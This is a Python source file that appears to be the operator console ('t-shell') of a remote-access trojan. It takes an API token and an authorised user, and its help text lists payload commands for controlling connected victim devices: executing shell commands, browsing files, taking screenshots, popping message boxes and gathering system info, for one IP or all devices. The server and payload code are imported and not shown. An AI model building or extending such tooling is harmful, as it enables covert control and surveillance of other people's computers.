#!/usr/bin/env python3
from os import system
import argparse
from server import server
from setting import print_banner

dictOpts = {
    'api':None,
    'output':None,
    'user':None}

def run():
    server(dictOpts['api'],
          dictOpts['user'],
          dictOpts['output'])
    print("Done")
    
def CheckStats():
    if dictOpts['api'] == None:
        ApiStat = 0
    elif dictOpts['api'] != None:
        ApiStat = 1
    if dictOpts['output'] == None:
        OutStat = 0
    elif dictOpts['output'] != None:
        OutStat = 1
    if dictOpts['user'] == None:
        UserStat = 0
    elif dictOpts['user'] != None:
        UserStat = 1
    Stats = ApiStat+OutStat+UserStat
    return Stats
    
def setter(option, value):
    if option == "api":
        dictOpts['api'] = value
    elif option == "output":
        dictOpts['output'] = value
    elif option == "user":
        dictOpts['user'] = value

def print_options(printOpts=False):
    OptsMessage = ("""
Options:
\tapi\t{}
\toutput\t{}
\tuser\t{}

Help options:
\tapi\tToken to access the HTTP API
\toutput\tSave the output in file
\tuser\tUser is allowed to command payload
""".format(
    dictOpts['api'], dictOpts['output'], dictOpts['user']
    )
                   )
    if printOpts:
        print(OptsMessage)

def print_help(printHelp=False):
    helpMessage = ("""
Help:

Options:
\thelp\tShow help message
\toptions\tShow options message 
\tset\tSet options api, output, user

Payload:
\t<IP> [option]\tChoose the device IP to control it
\tall [option]\tSelect and control all connected device titles
\tcmd [command]\tExcute command shell system device
\tls\tDisplay a list of files
\tpath\tDisplay a path
\tcd [directory]\tChanges the current directory
\tscreenshot\tTake a screenshot of device
\tmessagebox [title] [message]\tDisplay a message box
\tsysinfo\nDisplay same info about system
""")
    if printHelp:
        print(helpMessage)
        
def Analysis(command):
    text = command.split()
    option = text[0]
    if option == "set":
        try:
            var = text[1]
            val = text[2]
            setter(var, val)
        except IndexError:
            errmsg = ("error : set <option> <value>")
            print(errmsg)
    elif option == "run":
        stats = CheckStats()
        if stats == 3:
            run()
        elif stats == 2:
            errmsg = ("error: run: There is one have not given a value")
            print(errmsg)
        elif stats == 1:
            errmsg = ("error: run: There are two have not give it value")
            print(errmsg)
        elif stats == 0:
            errmsg = ("error: run: There are three did not give it value")
            print(errmsg)
    elif option == "options":
            print_options(True)
    elif option == "help":
            print_help(True)
    else:
        errmsg = ("error: t-shell: There is no command: {}".format(
            option
            )
                  )
        print(errmsg)

def main():
    print_banner(True)
    while True:
        command = input("t-shell> ")
        Analysis(command)
if __name__ == '__main__':
    main()
